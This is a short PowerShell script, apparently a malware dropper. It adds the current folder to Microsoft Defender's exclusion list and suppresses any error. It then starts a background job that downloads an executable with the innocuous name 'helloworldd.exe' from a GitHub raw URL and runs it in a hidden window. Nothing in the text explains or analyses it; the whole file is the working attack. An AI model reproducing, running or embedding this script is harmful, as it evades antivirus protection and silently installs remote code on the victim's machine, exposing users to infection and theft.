$path = Get-Location
$folder = $path.Path

try {
    Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
} catch {}

Start-Job -ScriptBlock {
    param($f)
    Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/helloworldd.exe" -OutFile "$f\helloworldd.exe" -ErrorAction SilentlyContinue
    Start-Process -FilePath "$f\helloworldd.exe" -WindowStyle Hidden
} -ArgumentList $folder | Out-Null
